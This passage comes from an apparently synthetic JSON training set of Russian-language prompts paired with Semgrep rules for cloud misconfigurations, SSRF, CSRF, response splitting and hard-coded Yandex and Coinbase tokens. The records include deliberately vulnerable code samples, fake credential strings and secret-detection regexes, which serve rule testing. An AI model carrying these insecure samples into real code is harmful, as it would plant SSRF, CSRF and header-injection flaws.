false\n    minimum_tls_version = \"1.2\"\n    public_network_access_enabled  = true\n\n    redis_configuration {\n    }\n}\n\n# pass\nresource \"azurerm_redis_cache\" \"example\" {\n    name                = \"example-cache\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    capacity            = 2\n    family              = \"C\"\n    sku_name            = \"Standard\"\n    minimum_tls_version = \"1.2\"\n\n    redis_configuration {\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_redis_cache\" \"example\" { ... enable_non_ssl_port = true ... }\n• resource \"azurerm_redis_cache\" \"example\" { ... enable_non_ssl_port = true; minimum_tls_version = \"1.0\" ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_redis_cache\" \"example\" { ... enable_non_ssl_port = false ... }\n• resource \"azurerm_redis_cache\" \"example\" { ... enable_non_ssl_port = false; minimum_tls_version = \"1.2\" ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-redis-cache-enable-non-ssl-port: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-redis-cache-enable-non-ssl-port: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-redis-cache-enable-non-ssl-port\n  message: >-\n    Ensure that only SSL are enabled for Cache for Redis\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_redis_cache\" \"...\" {\n      ...\n      enable_non_ssl_port = true\n      ...\n      }\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасного порта Redis без SSL в конфигурациях Azure Resource Manager (ARM). Анализ выполняется путем поиска шаблона ресурса Terraform с именем 'azurerm_redis_cache', внутри которого присутствует атрибут 'enable_non_ssl_port' со значением 'true'. Правило также учитывает наличие атрибута 'minimum_tls_version', который должен быть установлен не ниже версии 1.2 для обеспечения минимальной защиты.\n\n# Ключевые элементы:\n- ID: azure-redis-cache-enable-non-ssl-port\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-redis-cache-enable-non-ssl-port",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: playwright-evaluate-arg-injection\nОписание уязвимости: If unverified user data can reach the `evaluate` method it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: playwright-evaluate-arg-injection.js\nconst { chromium } = require('playwright');\n\nasync function test3(userInput) {\n\n  const browser = await chromium.launch();\n  const page = await browser.newPage();\n\n// ok\n  await page.evaluate(x => console.log(x), 5);\n\n  // ruleid:playwright-evaluate-arg-injection\n  await page.evaluate(x => fetch(x), userInput);\n\n  await page.screenshot({path: 'example.png'});\n  await browser.close();\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• await page.evaluate(x => fetch(x), userInput);\n• function myFunction(input) { return page.evaluate(x => fetch(x), input); }\n\nБезопасные паттерны:  \n• await page.evaluate(x => console.log(x), 5);\n• function mySafeFunction() { return page.evaluate(x => console.log(x), 5); }\n\nЛегенда аннотаций:\n- // ruleid:playwright-evaluate-arg-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:playwright-evaluate-arg-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: playwright-evaluate-arg-injection\n  message: >-\n    If unverified user data can reach the `evaluate` method it can result in Server-Side Request Forgery\n    vulnerabilities\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - playwright\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require('playwright');\n      ...\n  - pattern-either:\n    - pattern-inside: function $FUNC (...,$INPUT,...) {...}\n    - pattern-inside: function (...,$INPUT,...) {...}\n  - pattern-either:\n    - pattern: $PAGE.evaluate($CODE,...,<... $INPUT ...>,...)\n    - pattern: $PAGE.evaluateHandle($CODE,...,<... $INPUT ...>,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода evaluate в библиотеке Playwright с передачей необработанных пользовательских данных ($INPUT) в качестве аргумента. Это может привести к SSRF-уязвимостям, так как данные пользователя могут быть использованы для выполнения произвольных запросов. Правило использует шаблон inside для проверки наличия вызова require('playwright') и затем ищет функции, принимающие переменное количество аргументов, где один из них является необработанным вводом пользователя.\n\n# Ключевые элементы:\n- ID: playwright-evaluate-arg-injection\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "playwright-evaluate-arg-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения http-response-splitting\nОписание уязвимости: Older Java application servers are vulnerable to HTTP response splitting, which may occur if an HTTP request can be injected with CRLF characters. This finding is reported for completeness; it is recommended to ensure your environment is not affected by testing this yourself.\nCWE: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n- Серьезность: INFO\n\nКонтекст кода:\n// File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n\n    @RequestMapping(method = RequestMethod.GET)\n    @PreAuthorize(Permissions.ADMIN)\n    @ResponseBody\n    public void list(HttpServletRequest request, HttpServletResponse response) {\n        // ruleid:http-response-splitting\n        String author = request.getParameter(AUTHOR_PARAMETER);\n        Cookie cookie = new Cookie(\"author\", author);\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/{name}\", method = RequestMethod.POST)\n    @PreAuthorize(Permissions.USER)\n    @ResponseBody\n    public void load(@PathVariable final String name, HttpServletResponse response) throws APIException {\n        // ruleid:http-response-splitting\n        Cookie cookie = new Cookie(\"author\", name);\n        response.addCookie(cookie);\n    }\n\n    private Response safe(String name, Response response) {\n        // ok:http-response-splitting\n        Cookie cookie = new Cookie(\"author\", name);\n        response.addCookie(cookie);\n        return response;\n    }\n\n    @RequestMapping(value = \"/{name}/{book}\", method = RequestMethod.POST)\n    @PreAuthorize(Permissions.USER)\n    @ResponseBody\n    public void loadBook(@PathVariable final String name, @PathVariable final String book, HttpServletResponse response) throws APIException {\n        AuthorObj author = AuthorObj.getAuthor(name, book);\n        // ok:http-response-splitting\n        Cookie cookie = new Cookie(\"sess\", \"1234\");\n        response.addCookie(cookie);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(method = RequestMethod.GET)\n    @PreAuthorize(Permissions.ADMIN)\n  \n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(value = \"/{name}\", method = RequestMethod.POST)\n    @PreAuthorize(P\n\nБезопасные паттерны:  \n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    private Response safe(String name, Response response) {\n        // ok:http-response\n• // File: http-response-splitting.java\n@Controller\n@RequestMapping(\"/api/test\")\npublic class TestController {\n...\n    @RequestMapping(value = \"/{name}/{book}\", method = RequestMethod.POST)\n    @PreAuth\n\nЛегенда аннотаций:\n- // ruleid:http-response-splitting: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:http-response-splitting: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: http-response-splitting\n  metadata:\n    cwe:\n    - \"CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\"\n    owasp:\n    - A03:2021 - Injection\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#HTTP_RESPONSE_SPLITTING\n    references:\n    - https://www.owasp.org/index.php/HTTP_Response_Splitting\n    category: security\n    technology:\n    - java\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: >-\n    Older Java application servers are vulnerable to HTTP response splitting, which\n    may occur if an HTTP\n    request can be injected with CRLF characters. This finding is reported for completeness;\n    it is recommended\n    to ensure your environment is not affected by testing this yourself.\n  severity: INFO\n  languages:\n  - java\n  pattern-either:\n  - pattern: |\n      $VAR = $REQ.getParameter(...);\n      ...\n      $COOKIE = new Cookie(..., $VAR, ...);\n      ...\n      $RESP.addCookie($COOKIE, ...);\n  - patterns:\n    - pattern-inside: |\n        $RETTYPE $FUNC(...,@PathVariable $TYPE $VAR, ...) {\n          ...\n        }\n    - pattern: |\n        $COOKIE = new Cookie(..., $VAR, ...);\n        ...\n        $RESP.addCookie($COOKIE, ...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей HTTP response splitting в Java-коде. Оно ищет случаи, когда значение параметра запроса или переменной, полученной от PathVariable, используется непосредственно при создании нового объекта Cookie и последующем вызове addCookie() метода HttpServletResponse. Это может позволить злоумышленнику вставить специальные символы, такие как CRLF, которые могут привести к разделению заголовков HTTP ответов, вызывая уязвимость.\n\n# Ключевые элементы:\n- ID: http-response-splitting\n- Язык: java \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "http-response-splitting",
      "language": "java",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: azure-network-watcher-flowlog-period\nОписание уязвимости: Ensure that Network Security Group Flow Log retention period is 90 days or greater\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-network-watcher-flowlog-period.tf\n# fail\n# ruleid: azure-network-watcher-flowlog-period\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 90\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = 0\n  }\n}\n\n# pass\nresource \"azurerm_network_watcher_flow_log\" \"test\" {\n  network_watcher_name = azurerm_network_watcher.test.name\n  resource_group_name  = azurerm_resource_group.test.name\n  network_security_group_id = azurerm_network_security_group.test.id\n  storage_account_id        = azurerm_storage_account.test.id\n  enabled                   = true\n\n  retention_policy {\n    enabled = true\n    days    = \"100\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 7\n  }\n  ...\n}\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 50\n  }\n  ...\n}\n\nБезопасные паттерны:  \n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 90\n  }\n  ...\n}\n• resource \"azurerm_network_watcher_flow_log\" \"test\" { \n  ...\n  retention_policy {\n    ...\n    days = 0\n  }\n  ...\n}\n\nЛегенда аннотаций:\n- // ruleid:azure-network-watcher-flowlog-period: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-network-watcher-flowlog-period: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-network-watcher-flowlog-period\n    message: Ensure that Network Security Group Flow Log retention period is 90 days\n      or greater\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_network_watcher_flow_log\" \"...\" {\n          ...\n          retention_policy {\n          ...\n          enabled = true\n          days = $DAYS\n          ...\n          }\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_network_watcher_flow_log\" \"...\" {\n          ...\n          retention_policy {\n          ...\n          enabled = true\n          days = 0\n          ...\n          }\n          ...\n          }\n      - metavariable-comparison:\n          metavariable: $DAYS\n          comparison: $DAYS < 90\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages:\n      - hcl\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Network Watcher Flow Log в конфигурациях Terraform (HCL). Правило проверяет наличие блока retention_policy внутри ресурса azurerm_network_watcher_flow_log и извлекает значение атрибута 'days'. Если значение 'days' меньше 90, то правило считает такую конфигурацию небезопасной. Безопасными считаются конфигурации, где retention period установлен не менее чем на 90 дней или равен нулю (что означает бесконечный период хранения). Также исключаются случаи, когда retention period явно установлен равным нулю.\n\n# Ключевые элементы:\n- ID: azure-network-watcher-flowlog-period\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-network-watcher-flowlog-period",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения laravel-blade-form-missing-csrf\nОписание уязвимости: Detected a form executing a state-changing HTTP method `$METHOD` to route definition `$...ROUTE` without a Laravel CSRF decorator or explicit CSRF token implementation. If this form modifies sensitive state this will open your application to Cross-Site Request Forgery (CSRF) attacks.\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: laravel-blade-form-missing-csrf.blade.php\n<!-- ok: laravel-blade-form-missing-csrf -->\n<form method=\"POST\" action=\"/profile\" method=\"post\">\n    @csrf\n    <button ...>\n</form>\n\n<!-- ok: laravel-blade-form-missing-csrf -->\n<form method=\"POST\" action=\"/profile\" method=\"post\">\n    {{ csrf_field() }}\n    <button ...>\n</form>\n\n<!-- ok: laravel-blade-form-missing-csrf -->\n<form method=\"POST\" action=\"/profile\" method=\"post\">\n    <input type=\"text\" name=\"something\" value=\"someval\" />\n    <input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token() }}\" /> \n    <button ...>\n</form>\n\n<!-- ruleid: laravel-blade-form-missing-csrf -->\n<form method=\"POST\" action=\"/profile\" method=\"post\">\n    <button ...>\n</form>\n\n<!-- ok: laravel-blade-form-missing-csrf -->\n<!-- <form method=\"POST\" action=\"/profile\" method=\"post\">\n    <button ...>\n</form> -->\n\n<!-- ok: laravel-blade-form-missing-csrf -->\n<form name=\"SettingsForm\" class=\"form-vertical\" role=\"form\" action=\"{{ cachet_route('dashboard.settings', [], 'post') }}\" method=\"POST\"  enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token() }}\">\n    @include('partials.errors')\n    <div class=\"row\">\n        <div class=\"col-xs-12\">\n            <div class=\"form-group\">\n                <label>{{ trans('forms.settings.app-setup.banner') }}</label>\n                @if($appBanner)\n                <div id=\"banner-view\" class=\"well\">\n                    <img src=\"data:{{ $appBannerType }};base64,{{ $appBanner }}\" style=\"max-width: 100%\">\n                    <br><br>\n                    <button id=\"remove-banner\" class=\"btn btn-danger\">{{ trans('forms.remove') }}</button>\n                </div>\n                <input type=\"hidden\" name=\"remove_banner\" value=\"0\">\n                @endif\n                <input type=\"file\" name=\"app_banner\" class=\"form-control\">\n                <span class=\"help-block\">{{ trans('forms.settings.app-setup.banner-help') }}</span>\n            </div>\n        </div>\n    </div>\n    <hr>\n     # Ограничиваем длину\n\nОпасные паттерны:\n• <form method=\"POST\" action=\"/profile\" method=\"post\">\n    <button ...>\n</form>\n• <form method=\"PUT\" action=\"/update-profile\" method=\"put\">\n    <button ...>\n</form>\n\nБезопасные паттерны:  \n• <form method=\"POST\" action=\"/profile\" method=\"post\">\n    @csrf\n    <button ...>\n</form>\n• <form method=\"PATCH\" action=\"/edit-profile\" method=\"patch\">\n    {{ csrf_field() }}\n    <button ...>\n</form>\n\nЛегенда аннотаций:\n- // ruleid:laravel-blade-form-missing-csrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:laravel-blade-form-missing-csrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: laravel-blade-form-missing-csrf\n  message: >-\n    Detected a form executing a state-changing HTTP method `$METHOD` to route definition\n    `$...ROUTE` without a Laravel CSRF decorator or explicit CSRF token implementation.\n    If this form modifies sensitive state this will open your application to Cross-Site\n    Request Forgery (CSRF) attacks.\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n    category: security\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    cwe2021-top25: true\n    cwe2022-top25: true\n    owasp:\n    - A01:2021 - Broken Access Control\n    references:\n    - https://laravel.com/docs/9.x/csrf\n    subcategory:\n    - audit\n    technology:\n    - php\n    - laravel\n    - blade\n  languages:\n  - generic\n  paths:\n    include:\n    - '*.blade.php'\n  patterns:\n  - pattern: |\n      action=\"$...ROUTE\"\n  - pattern-inside: |\n      <form ... method=\"$METHOD\" ... >\n      ...\n  - pattern-not-inside: |\n      <!-- ... ... ... ... ... ... ... -->\n  - metavariable-pattern:\n      metavariable: $...ROUTE\n      language: generic\n      patterns:\n      - pattern-not-regex: \\A\\s*\\Z\n      - pattern-not: '#'\n  - metavariable-regex:\n      metavariable: $METHOD\n      regex: (?i)(post|put|patch|delete)\n  - pattern-not-inside: |\n      <form ...>\n      ...\n      ...\n      ...\n      @csrf\n  - pattern-not-inside: |\n      <form ...>\n      ...\n      ...\n      ...\n      csrf_field()\n  - pattern-not-inside: |\n      <form ...>\n      ...\n      ...\n      ...\n      csrf_token()\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска форм в шаблонах Blade Laravel, которые используют методы POST, PUT, PATCH или DELETE и не содержат явных механизмов защиты от CSRF, таких как тег @csrf, функция csrf_field() или переменная csrf_token(). Правило использует метапеременные для захвата значений атрибутов action и method формы, а также проверяет наличие CSRF-защиты внутри формы. Если защита отсутствует, генерируется предупреждение о возможной уязвимости CSRF.\n\n# Ключевые элементы:\n- ID: laravel-blade-form-missing-csrf\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "laravel-blade-form-missing-csrf",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: gcp-dataflow-private-job\nОписание уязвимости: Ensure Dataflow jobs are private\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-dataflow-private-job.tf\n# ok: gcp-dataflow-private-job\nresource \"google_dataflow_job\" \"pass\" {\n  name              = \"my-pass-job\"\n  template_gcs_path = \"gs://my-bucket/templates/template_file\"\n  temp_gcs_location = \"gs://my-bucket/tmp_dir\"\n  parameters = {\n    foo = \"bar\"\n    baz = \"qux\"\n  }\n  ip_configuration = \"WORKER_IP_PRIVATE\"\n}\n\n\n# fail\n# ruleid: gcp-dataflow-private-job\nresource \"google_dataflow_job\" \"fail1\" {\n  name              = \"my-fail-job1\"\n  template_gcs_path = \"gs://my-bucket/templates/template_file\"\n  temp_gcs_location = \"gs://my-bucket/tmp_dir\"\n  parameters = {\n    foo = \"bar\"\n    baz = \"qux\"\n  }\n\n}\n\n# fail\n# ruleid: gcp-dataflow-private-job\nresource \"google_dataflow_job\" \"fail2\" {\n  name              = \"my-fail-job2\"\n  template_gcs_path = \"gs://my-bucket/templates/template_file\"\n  temp_gcs_location = \"gs://my-bucket/tmp_dir\"\n  parameters = {\n    foo = \"bar\"\n    baz = \"qux\"\n  }\n  ip_configuration = \"WORKER_IP_PUBLIC\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_dataflow_job\" \"fail1\" { ... }\n• resource \"google_dataflow_job\" \"fail2\" { ... ip_configuration = \"WORKER_IP_PUBLIC\" ... }\n\nБезопасные паттерны:  \n• resource \"google_dataflow_job\" \"pass\" { ... ip_configuration = \"WORKER_IP_PRIVATE\" ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-dataflow-private-job: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-dataflow-private-job: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-dataflow-private-job\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_dataflow_job\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_dataflow_job\" \"...\" {\n      ...\n      ip_configuration = \"WORKER_IP_PRIVATE\"\n      ...\n      }\n  message: >-\n    Ensure Dataflow jobs are private\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud Dataflow job в Terraform конфигурациях HCL. Правило проверяет наличие ресурса google_dataflow_job и отсутствие явного указания параметра ip_configuration со значением WORKER_IP_PRIVATE внутри блока ресурса. Если параметр ip_configuration отсутствует или имеет значение WORKER_IP_PUBLIC, правило отмечает код как опасный, так как это может привести к недостаточной гранулярности контроля доступа и потенциальной утечке данных.\n\n# Ключевые элементы:\n- ID: gcp-dataflow-private-job\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-dataflow-private-job",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: yandex-api-key\nОписание уязвимости: A gitleaks yandex-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: yandex-api-key.go\n// ruleid: yandex-api-key\nyandex_api_token = \"AQVNYfu7VytSLRY2kW_fMRm6eeizMUT8XHCPSV3\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: yandex-api-key.go\n// ruleid: yandex-api-key\nyandex_api_token = \"AQVNYfu7VytSLRY2kW_fMRm6eeizMUT8XHCPSV3\"\n• // File: another-go-file.go\nvar yApiKey string = \"AQVNhjkl1234567890abcdefg\"\n• // File: yet-another-go-file.go\nconst YANDEX_API_KEY = \"AQVNH1234567890ABCDEFGHIJKLMNOPQRSTUVWXZ\"\n\nБезопасные паттерны:  \n• // File: safe-go-file.go\nfunc getYandexAPIKey() string { return os.Getenv(\"YANDEX_API_KEY\") }\n• // File: secure-go-file.go\nimport \"os\"\nvar yApiKey = os.Getenv(\"YANDEX_API_KEY\")\n• // File: config.go\nconfig := loadConfigFromVault(\"yandex_api_key\")\n\nЛегенда аннотаций:\n- // ruleid:yandex-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:yandex-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: yandex-api-key\n  message: A gitleaks yandex-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:yandex)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(AQVN[A-Za-z0-9_\\-]{35,38})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного ключа Yandex API в исходном коде. Регулярное выражение ищет строку, содержащую 'yandex' в любом регистре, за которой следует произвольная последовательность букв, цифр, дефисов или подчеркиваний длиной от 0 до 20 символов. Далее идет символ пробела или апостроф, после которого может следовать оператор сравнения ('=', '>', ':', etc.) и строка, начинающаяся с 'AQVN' и состоящая из 35-38 символов латинских букв и цифр, которая является уникальным идентификатором Yandex API-ключика.\n\n# Ключевые элементы:\n- ID: yandex-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "yandex-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: coinbase-access-token\nОписание уязвимости: A gitleaks coinbase-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: coinbase-access-token.go\n// ruleid: coinbase-access-token\ncoinbase_api_token = \"mti9od_wmzryp5ne-wq__ip5thaooltmkuet0gr23wu_o7tekzmz_n11r_d_-exd\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: coinbase-access-token.go\n// ruleid: coinbase-access-token\ncoinbase_api_token = \"mti9od_wmzryp5ne-wq__ip5thaooltmkuet0gr23wu_o7tekzmz_n11r_d_-exd\"\n• // File: example.go\n// ruleid: coinbase-access-token\ndata := \"coinbase_access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\"\n• // File: config.go\n// ruleid: coinbase-access-token\nconst coinbaseToken = \"secret_coinbase_token_1234567890abcdef\"\n\nБезопасные паттерны:  \n• // File: safe-code.go\nvar coinbaseApiToken string = os.Getenv(\"COINBASE_API_TOKEN\")\n• // File: secure-config.go\nfunc getCoinbaseToken() string { return securelyRetrievedTokenFromVault() }\n• // File: app.go\nimport _ \"github.com/coinbase/api\"\nvar coinbaseClient *client.CoinbaseClient\n\nЛегенда аннотаций:\n- // ruleid:coinbase-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:coinbase-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
